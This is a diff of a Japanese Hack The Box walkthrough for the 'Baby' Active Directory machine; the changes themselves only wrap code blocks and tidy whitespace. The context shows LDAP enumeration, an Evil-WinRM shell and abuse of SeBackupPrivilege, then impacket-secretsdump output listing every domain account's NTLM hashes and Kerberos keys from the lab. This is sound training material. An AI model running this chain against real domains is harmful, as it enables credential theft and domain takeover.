@@ -8,6 +8,8 @@ htbDifficulty: 'easy'
 htbMachineImage: './images/htb-baby.png'
 ---
 
+import CollapsibleCode from '../../components/CollapsibleCode.astro';
+
 > [!caution]
 > この記事は合法的なペネトレーションテスト環境（Hack The Box）での攻略内容です。許可のないシステムへの攻撃は違法です。
 
@@ -60,10 +62,11 @@ Nmap done: 1 IP address (1 host up) scanned in 44.59 seconds
 ```
 いくつか開いているポートが確認できたので、ポート番号を抽出して、詳細スキャンを実行します。
 
+<CollapsibleCode>
 ```bash
 ┌──(kali㉿kali)-[~/htb/baby.htb]
-└─$ grep -oP '\d+/open' nmap/allports.gnmap | cut -d '/' -f 1 | tr '\n' ','               
-53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,53871,53888,58250,58251,58259,                                                                                                                                                                                                                                          
+└─$ grep -oP '\d+/open' nmap/allports.gnmap | cut -d '/' -f 1 | tr '\n' ','
+53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,53871,53888,58250,58251,58259,
 ┌──(kali㉿kali)-[~/htb/baby.htb]
 └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,53871,53888,58250,5
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 02:42 -0500
@@ -84,7 +87,7 @@ PORT      STATE SERVICE       VERSION
 3269/tcp  open  tcpwrapped
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
 |_ssl-date: 2026-03-04T07:43:49+00:00; 0s from scanner time.
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
 |   Target_Name: BABY
 |   NetBIOS_Domain_Name: BABY
 |   NetBIOS_Computer_Name: BABYDC
@@ -110,17 +113,18 @@ PORT      STATE SERVICE       VERSION
 Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
+| smb2-security-mode:
+|   3.1.1:
 |_    Message signing enabled and required
-| smb2-time: 
+| smb2-time:
 |   date: 2026-03-04T07:43:11
 |_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 107.06 seconds
- 
+
 ```
+</CollapsibleCode>
 Active Directoryのドメインコントローラーですね。
 ドメイン名が `baby.vl` で、コンピュータ名が `BabyDC.baby.vl` であることがわかります。
 これを `/etc/hosts` に追加しておきます。
@@ -144,6 +148,7 @@ Attack Surfaceの分析として、
 LDAPに関するチートシートは、こちらが有用です。
 [Pentesting LDAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html)
 
+<CollapsibleCode>
 ```bash
 ┌──(kali㉿kali)-[~/htb/baby.htb]
 └─$ ldapsearch -x -H ldap://baby.vl -s base -b '' "(objectClass=*)" "*" +
@@ -152,7 +157,7 @@ LDAPに関するチートシートは、こちらが有用です。
 # LDAPv3
 # base <> with scope baseObject
 # filter: (objectClass=*)
-# requesting: * + 
+# requesting: * +
 #
 
 #
@@ -261,20 +266,22 @@ result: 0 Success
 # numResponses: 2
 # numEntries: 1
 ```
+</CollapsibleCode>
 
 `defaultNamingContext: DC=baby,DC=vl` や `namingContexts: DC=baby,DC=vl` から、LDAPのベースDNは `DC=baby,DC=vl` であることがわかります。
 
 次に、ユーザーオブジェクトを検索してみます。
 
+<CollapsibleCode>
 ```bash
 ┌──(kali㉿kali)-[~/htb/baby.htb]
-└─$ ldapsearch -x -H ldap://baby.vl -b "DC=baby,DC=vl" "(&(objectClass=user)(objectCategory=person))" sAMAccountName description memberOf  
+└─$ ldapsearch -x -H ldap://baby.vl -b "DC=baby,DC=vl" "(&(objectClass=user)(objectCategory=person))" sAMAccountName description memberOf
 # extended LDIF
 #
 # LDAPv3
 # base <DC=baby,DC=vl> with scope subtree
 # filter: (&(objectClass=user)(objectCategory=person))
-# requesting: sAMAccountName description memberOf 
+# requesting: sAMAccountName description memberOf
 #
 
 # Guest, Users, baby.vl
@@ -341,6 +348,7 @@ result: 0 Success
 # numEntries: 9
 # numReferences: 3
 ```
+</CollapsibleCode>
 
 匿名バインドは成功しており、ユーザーオブジェクトの情報を取得できました。
 
@@ -564,6 +572,7 @@ Info: Establishing connection to remote endpoint
 次は、root.txt を目指して、権限昇格の方法を模索します。
 
 まずは、現在の権限を確認します。
+<CollapsibleCode>
 ```bash
 *Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /all
 
@@ -613,6 +622,7 @@ User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
+</CollapsibleCode>
 
 Caroline.Robinsonユーザーは、`Backup Operators` グループのメンバーであることがわかります。
 また、`SeBackupPrivilege` と `SeRestorePrivilege` という特権が有効になっています。
@@ -849,16 +859,17 @@ Info: Download successful!
 では、 `impacket-secretsdump` を利用して、Hashを解析します。
 `-ntds` オプションでntds.ditファイルを指定し、`-system` オプションでsystem.hiveファイルを指定します。
 
+<CollapsibleCode>
 ```bash
 ┌──(kali㉿kali)-[~/htb/baby.htb]
 └─$ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Searching for pekList, be patient
 [*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
-[*] Reading and decrypting hashes from ntds.dit 
+[*] Reading and decrypting hashes from ntds.dit
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
@@ -873,7 +884,7 @@ baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2e
 baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
 baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
 baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::
-[*] Kerberos keys from ntds.dit 
+[*] Kerberos keys from ntds.dit
 Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
 Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
 Administrator:des-cbc-md5:d38cb994ae806b97
@@ -913,9 +924,10 @@ baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
 baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:6fe5d46e01d6cf9909f479fb4d7afac0bd973981dd958e730a734aa82c9e13af
 baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:f34e6c0c8686a46eea8fd15a361601f9
 baby.vl\Caroline.Robinson:des-cbc-md5:fd40190d579138df
-[*] Cleaning up... 
+[*] Cleaning up...
 
 ```
+</CollapsibleCode>
 
 ドメイン全体のHashが取得できました!!!
 
